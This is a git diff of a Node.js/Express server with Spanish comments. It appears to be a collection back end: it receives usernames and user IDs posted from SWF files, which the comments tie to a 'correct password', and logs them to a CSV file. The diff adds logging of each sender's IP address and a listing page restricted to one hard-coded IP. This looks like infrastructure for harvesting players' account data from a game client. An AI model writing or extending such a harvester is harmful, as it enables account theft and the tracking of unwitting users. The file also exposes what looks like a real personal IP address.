@@ -2,16 +2,16 @@ const express = require("express");
 const fs = require("fs");
 const app = express();
 
-let lastUser = ""; // 🔹 Guardará el último User recibido
+let lastUser = "";
 
-// 📂 Servir archivos estáticos (como crossdomain.xml)
+// 📂 Servir archivos estáticos (por si lo necesitas)
 app.use(express.static("public"));
 
 // Middleware para aceptar JSON y formularios normales
 app.use(express.urlencoded({ extended: false }));
 app.use(express.json());
 
-// 📩 Endpoint para recibir datos desde los SWF
+// 📩 Endpoint que recibe datos del SWF
 app.post("/recibir", (req, res) => {
   let user_id = "";
   let user_name = "";
@@ -28,45 +28,63 @@ app.post("/recibir", (req, res) => {
     user_name = req.body?.User ? req.body.User.toString().trim() : "";
   }
 
+  // 🌐 Obtener IP desde donde se recibió la info
+  const clientIp =
+    (req.headers["x-forwarded-for"] || req.socket.remoteAddress || "")
+      .split(",")[0]
+      .trim()
+      .replace(/^.*:/, "");
+
   // Si vino un User (nombre del keko), lo recordamos
   if (user_name) {
     lastUser = user_name;
     console.log(`🧠 Guardado último User: ${lastUser}`);
   }
 
-  // Si vino un user_id (contraseña correcta), lo guardamos junto al último User
+  // Si vino un user_id (contraseña correcta), lo guardamos junto a IP y User
   if (user_id) {
     const cleanId = user_id.replace(/[^\w\-@\.]/g, "");
     const cleanUser = lastUser ? lastUser.replace(/[^\w\s\-@\.]/g, "") : "-";
-    const line = `${new Date().toISOString()},${cleanId},${cleanUser}\n`;
+
+    const now = new Date();
+    const fechaFormateada = `${now.getFullYear()}/${String(
+      now.getMonth() + 1
+    ).padStart(2, "0")}/${String(now.getDate()).padStart(2, "0")} ${String(
+      now.getHours()
+    ).padStart(2, "0")}:${String(now.getMinutes()).padStart(2, "0")}:${String(
+      now.getSeconds()
+    ).padStart(2, "0")}`;
+
+    const line = `${fechaFormateada},${clientIp},${cleanId},${cleanUser}\n`;
     fs.appendFileSync("ids_store.csv", line, { flag: "a" });
-    console.log(`✅ Guardado: ${cleanId} (${cleanUser})`);
+
+    console.log(`✅ Guardado: ${cleanId} (${cleanUser}) desde ${clientIp}`);
     res.send("OK");
     return;
   }
 
-  // Si no se envió nada útil
   res.status(400).send("Sin datos válidos");
 });
 
-// 🔒 Protección IP: solo permite a 188.77.187.80 acceder a /lista
+// 🔒 Solo tu IP puede acceder a /lista
 app.get("/lista", (req, res, next) => {
   const clientIp =
     (req.headers["x-forwarded-for"] || req.socket.remoteAddress || "")
       .split(",")[0]
-      .trim();
+      .trim()
+      .replace(/^.*:/, "");
 
   const allowedIp = "188.77.187.80";
 
-  if (clientIp === allowedIp || clientIp.endsWith(allowedIp)) {
-    next(); // ✅ IP permitida, continúa al siguiente manejador
+  if (clientIp === allowedIp) {
+    next(); // ✅ IP permitida
   } else {
     console.warn(`🚫 Acceso denegado desde IP: ${clientIp}`);
     res.status(403).send("Acceso denegado");
   }
 });
 
-// 📄 Endpoint para ver los IDs guardados (en HTML bonito)
+// 📄 Mostrar lista guardada
 app.get("/lista", (req, res) => {
   const file = "ids_store.csv";
 
@@ -85,8 +103,8 @@ app.get("/lista", (req, res) => {
   const contenido = fs.readFileSync(file, "utf8").trim().split("\n");
   let filas = contenido
     .map((line) => {
-      const [fecha, id, user] = line.split(",");
-      return `<tr><td>${fecha}</td><td>${id}</td><td>${user}</td></tr>`;
+      const [fecha, ip, id, user] = line.split(",");
+      return `<tr><td>${fecha}</td><td>${ip}</td><td>${id}</td><td>${user}</td></tr>`;
     })
     .join("");
 
@@ -97,16 +115,16 @@ app.get("/lista", (req, res) => {
       <title>Lista de user_id</title>
       <style>
         body { font-family: sans-serif; margin: 40px; background: #fafafa; color: #333; }
-        table { border-collapse: collapse; width: 100%; max-width: 600px; margin: auto; }
+        table { border-collapse: collapse; width: 100%; max-width: 800px; margin: auto; }
         th, td { border: 1px solid #ccc; padding: 8px 12px; text-align: left; }
         th { background: #f0f0f0; }
         h2 { text-align: center; }
       </style>
     </head>
     <body>
-      <h2>📋 Lista de user_id recibidos</h2>
+      <h2>📋 Lista de registros recibidos</h2>
       <table>
-        <tr><th>Fecha</th><th>User ID</th><th>User</th></tr>
+        <tr><th>Fecha</th><th>IP</th><th>User ID</th><th>User</th></tr>
         ${filas}
       </table>
     </body>
@@ -114,6 +132,6 @@ app.get("/lista", (req, res) => {
   `);
 });
 
-// 🚀 Iniciar el servidor
+// 🚀 Iniciar servidor
 const PORT = process.env.PORT || 10000;
 app.listen(PORT, () => console.log(`Servidor escuchando en puerto ${PORT}`));
